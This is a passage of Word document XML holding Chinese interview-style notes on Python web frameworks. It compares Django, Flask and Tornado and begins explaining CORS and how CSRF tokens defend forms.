          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的对比？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541846B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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>走的大而全的方向，开发效率高。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425CE152"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它的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架，自带的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM,admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>后台管理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>自带的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>sqlite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>数据库和开发测试用的服务器，给开发者提高了超高的开发效率。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003CEBA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重量级</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架，功能齐全，提供一站式解决的思路，能让开发者不用在选择上花费大量时间。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C28DF2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自带</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和模板引擎，支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>jinja</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>等非官方模板引擎。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07059637"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自带</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>使</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和关系型数据库耦合度高，如果要使用非关系型数据库，需要使用第三方库</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6082E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自带数据库管理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">app </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>成熟，稳定，开发效率高，相对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的整体封闭性比较好，适合做企业级网站的开发。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8C0B8E"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python web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架的先驱，第三方库丰富</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A3FC7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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flask </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是轻量级的框架，自由，灵活，可扩展性强，核心基于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Werkzeug WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>工具</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">jinja2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>模板引擎</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E190558"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适用于做小网站以及</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>API,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>开发大型网站无压力，但架构需要自己设计</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>与关系型数据库的结合不弱于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，而与非关系型数据库的结合远远优于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EEEFF0"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>走的是少而精的方向，性能优越，它最出名的异步非阻塞的设计方式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5977A46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Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的两大核心模块：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>IOStream:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对非阻塞的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>进行简单的封装</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">IOLoop: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">I/O </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>多路复用的封装</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>它实现一个单例</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEAD191" w14:textId="23E96BA3"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 xml:space="preserve">3 CORS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147692D4"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什么是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> CORS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>W3C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>标准</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>全称是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>跨域资源共享</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">"(Cross-origin resoure sharing). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>它允许浏览器向跨源服务器，发出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>XMLHttpRequest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>请求，从而客服了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>AJAX</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>只能同源使用的限制。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EB78C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什么是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>主流防御方式是在后端生成表单的时候生成一串随机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>内置到表单里成为一个字段，同时，将此串</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>置入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中。每次表单提交到后端时都会检查这两个值是否一致，以此来判断此次表单提交是否是可信的，提交过一次之后，如果这个页面没有生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>CSRF token,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>那么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>将会被清空</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>如果有新的需求，那么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>会被更新。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>攻击者可以伪造</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>表单提交，但是他没有后端生成的内置于表单的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中没有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
